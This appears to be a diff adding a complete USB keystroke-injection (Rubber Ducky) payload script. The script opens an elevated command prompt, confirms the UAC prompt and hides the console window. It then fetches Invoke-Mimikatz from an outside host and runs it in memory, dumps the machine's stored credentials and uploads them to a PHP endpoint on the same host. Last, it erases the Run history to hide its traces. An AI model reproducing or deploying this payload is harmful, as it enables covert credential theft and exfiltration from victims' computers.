@@ -1,0 +1,21 @@
+GUI r
+DELAY 500
+STRING powershell Start-Process cmd -Verb runAs
+ENTER
+DELAY 2000
+ALT j
+DELAY 1000
+REM Obfuscate the command prompt
+STRING mode con:cols=18 lines=1
+ENTER
+STRING color FE
+ENTER
+REM Download and execute Invoke Mimikatz then upload the results
+STRING powershell "powershell "$AllProtocols = [System.Net.SecurityProtocolType]'Tls12';[System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols;IEX (New-Object Net.WebClient).DownloadString('https://f5w.de/h/im.ps1'); $output = Invoke-Mimikatz -DumpCreds; (New-Object Net.WebClient).UploadString('https://f5w.de/h/rx.php', $output)""
+ENTER
+DELAY 15000
+REM Clear the Run history and exit
+STRING powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+ENTER
+STRING exit
+ENTER
